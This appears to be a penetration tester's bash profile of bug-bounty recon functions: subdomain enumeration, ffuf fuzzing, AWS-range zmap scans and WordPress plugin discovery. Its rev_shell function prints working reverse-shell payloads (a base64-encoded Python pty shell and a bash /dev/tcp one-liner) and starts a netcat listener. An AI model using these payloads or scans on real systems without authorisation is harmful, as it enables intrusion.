# configuration
export PATH=$PATH:~/bin:~/go/bin:~/.local/bin:/usr/local/sbin
export WORDLISTS=$HOME/wordlists
export DISCOVERY=$HOME/discovery
export DOMAINS=$HOME/hosts
export BACKUP=$HOME/backup
export ZMAP=$HOME/zmap
export ZMAP_RATE=30000
export BACKUP_DOTFILES=($HOME/.profile $HOME/.tmux.conf)
export UA_LIST=$WORDLISTS/useragents.txt
export BBP_HEADER="X-Bug-Bounty:"
export GAU_IGNORE="ttf,svg,webp,png,jpg,ico,ppt,pptx,jpeg,gif,css,tif,tiff,woff,woff2,pdf,txt,js,map,doc"

# startup help screen
_help() {
	local _version="0.1.2"
	local _usage="
		.hack profile loaded.
		Version: $_version
		Last backup time: $(_creation "$BACKUP/backup.tgz")

		Available commands:

		addword - add a word or file containing words to existing wordlists
		backup - create archive of discovery data, subdomains, wordlists, and dotfiles
		dns_fail - check list of hosts for SERVFAIL/REFUSED using zdns
		fuzz_params - fuzz host for parameters using ffuf
		fuzz_wp - fuzz host(s) for WordPress plugins using ffuf
		fuzz_vhost - fuzz host(s) for vhosts with ffuf using list of subdomains
		get_endpoints - run getallurls on a given domain or file
		get_subs - perform subdomain enumeration using findomain/subfinder and extract unique hosts
		get_wp_plugins - download latest copy of all WordPress plugins and extract names to wp_plugins.txt
		random_string - print a random string of alphanumeric characters [a-z0-9] with optional length
		random_ua - print a random User-Agent
		rev_shell - spawn netcat listener & output bash and python with base64 encoded payload
		showcert - show SSL certificate information for a given host
		zm - enumerate cloud ranges for given AWS region and extract hostnames from SSL certificates
		zparse - extract hostnames from zgrab output

		Aliases:
	"
	echo "$_usage"
	echo "$(alias | awk '{$1="";print("\t\t"substr($0,2))}')"
	echo; echo
}

_creation() {
	if [ -f "$1" ]; then
		echo $(stat $1 | grep Birth | cut -d' ' -f 3,4)
	else
		echo "NONE"
	fi
}

# backup $WORDLISTS $DISCOVERY $DOMAINS and $BACKUP_DOTFILES. if backup already exists, copies to separate archive and appends date
# output -> $BACKUP/backup.tgz
backup() {
	mkdir -p "$BACKUP"
	if [ -f "$BACKUP/backup.tgz" ]; then
		cp "$BACKUP/backup.tgz" "$BACKUP/backup.$(date +%m%d%y)"
	fi

	backup_dotfiles
	tar --exclude="wordlists/data" -zcf "$BACKUP/backup.tgz" -C "$HOME" wordlists discovery hosts dotfiles
	rm -rf "$HOME/dotfiles"
}

# backup dotfiles from $BACKUP_DOTFILES
# output -> $HOME/dotfiles
backup_dotfiles() {
	mkdir -p "$HOME/dotfiles"
	for i in ${BACKUP_DOTFILES[*]}; do
		cp "$i" "$HOME/dotfiles/$(echo $i | awk -F '/\.' '{print $2}')"
	done
}

dns_fail() {
	zdns A --name-servers 1.1.1.1 --threads 500 | \
		jq -r 'select((.status == "SERVFAIL" or .status == "REFUSED") and .status != "NOERROR") | .name'
}

# picks a random User-Agent from wordlist at $UA_LIST, if none is found supply a default
random_ua() {
	if [ -f "$UA_LIST" ]; then
		shuf -n 1 "$UA_LIST"
	else
		echo "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.48 Safari/525.19"
	fi
}

random_string() {
	local len=8
	if [ $# -eq 1 ]; then
		len="$1"
	fi

	LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c "$len"
	echo
}

rev_shell() {
	local ip=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1) port=80
	if [ $# -eq 1 ]; then
		port=$1
	fi

	echo "rev_shell: creating base64 encoded payload to connect to $ip:$port"; echo
	local shell="import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
	local py_code="python -c 'import base64;exec(base64.b64decode(\"$(echo $shell|base64 -w 0)\"))'"

	echo
	echo $py_code; echo

	echo "bash -i >& /dev/tcp/$ip/$port 0>&1"; echo
	echo "rev_shell: spawning netcat listener"
	if [ $port -lt 1024 ]; then
		echo "rev_shell: trying sudo to listen on privileged port"
		sudo nc -vv -l -s "$ip" -p "$port"
	else
		nc -vv -l -s "$ip" -p "$port"
	fi
}

# return all endpoints from getallurls for a given domain or file containing several domains/subdomains
# output -> $DISCOVERY/gau/<domain name>/<subdomain name>.gau
get_endpoints() {
	if [ $# -eq 0 ]; then
		echo "Usage: get_endpoints [domain|file]"
		return
	fi

	if [ -f $1 ]; then
		for i in $(cat "$1"); do
			_get_endpoints "$i"
		done
	else
		_get_endpoints "$1"
	fi
}

_check_ip() {
	local rx='([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])'
	local ip=$1
	if [[ $ip =~ ^$rx\.$rx\.$rx\.$rx$ ]]; then
		return 0
	else
		return 1
	fi
}

_get_endpoints() {
	local domain=$(echo "$1" | unfurl format %r.%t)
	local output="$DISCOVERY/gau/$domain/$1.gau"
	mkdir -p "$DISCOVERY/gau/$domain"
	echo "$1" | gau -b "$GAU_IGNORE" | grep = | qsreplace | sort -u > "$output"
	echo "get_endpoints: $(wc -l "$output" | awk '{print $1}') endpoints found for $1 - saved to $output"
}

# functions for checking proper tools are installed and in $PATH
_check_deps() {
	local dependencies=(zmap zgrab zdns gau findomain subfinder jq qsreplace anew ffuf openssl wget nc)
	for i in ${dependencies[*]}; do
		if [ ! $(which "$i") ]; then
			echo "_check_deps: couldn't locate required program $i. Some functionality will be broken!"
		fi
	done
}

ffufq() {
	local domain=$(echo $1 | unfurl format %s%d)
	local exts
	if [ ! $2 ]; then
		exts=".asp,.aspx,.cgi,.cfml,.CFM,.htm,.html,.json,.jsp,.php,.phtml,.pl,.py,.sh,.shtml,.sql,.txt,.xml,.xhtml,.tar,.tar.gz,.tgz,.war,.zip,.swp,.src,.jar,.java,.log,.bin,.js,.db,.cfg,.config"
	else
		exts="$2"
	fi

	mkdir -p "$DISCOVERY/quick"
	ffuf -c -v -u "$1/FUZZ" -w "$WORDLISTS/quick.txt" \
		-e "$exts"
		-H "User-Agent: $(random_ua)" \
		-H "$BBP_HEADER" \
		-ac -mc all \
		-o "$DISCOVERY/quick/$domain" \
}

ffufd() {
	mkdir -p "$DISCOVERY/dirs"
	local domain=$(echo $1 | unfurl format %s%d)
	ffuf -c -v -u "$1/FUZZ" -w "$WORDLISTS/dirs.txt" \
		-e "/" \
		-H "User-Agent: $(random_ua)" \
		-H "$BBP_HEADER" \
		-mc all -ac \
		-recursion -recursion-depth 5 \
		-o "$DISCOVERY/dirs/$domain.csv"
}

# returns all unique subdomains found using subfinder/findomain
# domains with existing results will be updated and print count of new subdomains found
# output -> $DOMAINS/<domain name>
getsubs() {
	if [ $# -eq 0 ]; then
		echo "Usage: getsubs [domain]"
		return
	fi

	local output="$DOMAINS/$1"
	mkdir -p "$DOMAINS"
	subfinder -d "$1" -o "/tmp/$1.sf.tmp" >/dev/null 2>/dev/null
	findomain -t "$1" -u "/tmp/$1.fd.tmp" >/dev/null 2>/dev/null

	if [ -f "$output" ]; then
		local subs=$(cat "/tmp/$1.fd.tmp" "/tmp/$1.sf.tmp" 2>/dev/null | sort -u | anew "$output" | wc -l | awk '{print $1}')
		echo "$1: $subs new subdomains found"
	else
		cat "/tmp/$1.fd.tmp" "/tmp/$1.sf.tmp" 2>/dev/null | sort -u > "$output"
		local subs=$(wc -l $output|awk '{print $1}')
		echo "$1: $subs subdomains found"
	fi
	rm -f "/tmp/$1.fd.tmp" "/tmp/$1.sf.tmp"
}

# connect to SSL host and dump certificate
showcert() {
	if [ $# -eq 0 ]; then
		echo "Usage: showcert [host|url]"
		return
	fi

	local rhost=$(echo "$1"|awk -F '://' '{print $2}')
	openssl s_client -showcerts -connect "$rhost:443" 2>/dev/null | egrep "subject=|issuer="
}

# add a single new word or file containing new words to existing wordlists
# output -> $WORDLISTS/{dirs,big,quick}.txt
addword() {
	local lists=($WORDLISTS/dirs.txt $WORDLISTS/big.txt $WORDLISTS/quick.txt)
	if [ $# -eq 0 ]; then
		echo "Usage: addword [word|file]"
		return
	fi

	for i in ${lists[*]}; do
		echo "$i"
		if [ -f $1 ]; then
			cat "$1" | anew "$i"
		else
			echo "$1" | anew "$i"
		fi
	done
}

# parsing helper for zgrab output
zparse() {
        if [ ! $# -eq 0 ]; then
                cat $1 | jq -r -c '.ip + ": " + .data.tls.result.handshake_log.server_certificates.certificate.parsed.names[]' 2>/dev/null
       else
                jq -r -c '.ip + ": " + .data.tls.result.handshake_log.server_certificates.certificate.parsed.names[]' 2>/dev/null

	fi
}

# extract certificates from range of AWS hosts like "us-east-1" and output "IP: site.com" format
# output -> $ZMAP/zmap.<region>.results
zm() {
        if [ $# -eq 0 ]; then
                echo "Usage: zm <region>"
		return
	fi

	local region="$1"
	mkdir -p "$ZMAP"
        echo "zm: scanning $region"
        wget https://ip-ranges.amazonaws.com/ip-ranges.json 2>/dev/null
        jq --arg REGION "$region" \
		-r '.prefixes[] | select(.region=="\($REGION)") | .ip_prefix' ip-ranges.json > "$ZMAP/$region.ranges"
        sudo /usr/local/sbin/zmap -r "$ZMAP_RATE" -p 443 -w "$ZMAP/$region.ranges" -o "$ZMAP/$region.out"

	if [ -f "$ZMAP/$region.out" ]; then
        	cat "$ZMAP/$region.out" | \
        	awk '!a[$0]++' | \
        	zgrab tls -p 443 2>/dev/null | \
        	zparse | \
        	tee -a "$ZMAP/zmap.$region.results"
	else
		echo "zm: error running zmap"
	fi

        rm -f ip-ranges.json "$ZMAP/$region.ranges" "$ZMAP/$region.out"
}

# get list of wordpress plugins
# output -> $WORDLISTS/wp_plugins.txt
get_wp_plugins() {
	curl http://plugins.svn.wordpress.org/ 2>/dev/null |\
	       	tail -n +5 |\
	       	sed -e 's/<[^>]*>//g' -e 's/\///' -e 's/ \+//gp' |\
	       	sort -u > "$WORDLISTS/wp_plugins.txt"
	local count=$(wc -l "$WORDLISTS/wp_plugins.txt"|awk '{print $1}')
	echo "get_wp_plugins: added $count plugins to $WORDLISTS/wp_plugins.txt"
}

# fuzz site(s) for wordpress plugins
fuzz_wp() {
	if [ $# -eq 0 ]; then
		echo "Usage: fuzz_wp [site|file]"
		return
	fi

	if [ -f "$1" ]; then
		ffuf -u "https://HOST/wp-content/plugins/FUZZ/readme.txt" \
			-w "FUZZ:$WORDLISTS/wp_plugins.txt" \
			-w "HOST:$1" \
			-H "User-Agent: $(random_ua)" \
			-mc 200,204
	else
		ffuf -u "$1/wp-content/plugins/FUZZ/readme.txt" \
			-w "$WORDLISTS/wp_plugins.txt" \
			-H "User-Agent: $(random_ua)" \
			-mc 200,204,403
	fi
}

fuzz_params() {
	if [ $# -eq 0 ]; then
		echo "Usage: fuzz_params [site] [optional: method name]"
		return
	fi
	local value="$(random_string)"

	if [ ! $2 ]; then
		ffuf -u "$1?FUZZ=$value" \
			-mc all \
			-c -ac \
			-w "$WORDLISTS/params.txt" \
			-H "User-Agent: $(random_ua)"
	else
		ffuf -u "$1" \
			-X POST \
			-mc all -c -ac \
			-d "FUZZ=$value" \
			-X "$2" \
			-w "$WORDLISTS/params.txt" \
			-H "User-Agent: $(random_ua)"
	fi
}

fuzz_vhost() {
	if [ $# -lt 2 ]; then
		echo "Usage: fuzz_vhost [site] [list]"
		return
	fi

	if [ ! -f "$2" ]; then
		echo "fuzz_vhost: can't open file $2"
		return
	fi

	local domain=""
	local host="$1"
	if [[ $host != *"://"* ]]; then
		host="https://$host"
	fi
	echo "host: $host"

	if _check_ip "$(echo $host | unfurl format %d)"; then
		echo "fuzz_vhost: got ip address. using random test string"
		domain="$(random_string).$(random_string).com"	
	else
		domain="$(random_string).$(echo $host | unfurl format %r.%t)"
	fi


	local size=$(/usr/bin/curl -s -k -H "Host: $(random_string).$domain" "$host" | wc -c)
	echo "fuzz_vhost: trying $host. filtering size $size"

	ffuf -u "$host" \
		-H "Host: FUZZ" \
		-w "$2" \
		-fs "$size" \
		-H "User-Agent: $(random_ua)" \
		-mc all -c
	echo
}

alias ls="ls --color"
alias curl="curl -ki --path-as-is -H \"User-Agent: $(random_ua)\""
alias nmap="nmap -sT -A -p- -T4"
alias ferox="feroxbuster --user-agent \"$(random_ua)\""

# make sure all the required tools are installed. otherwise give a warning
_help
_check_deps
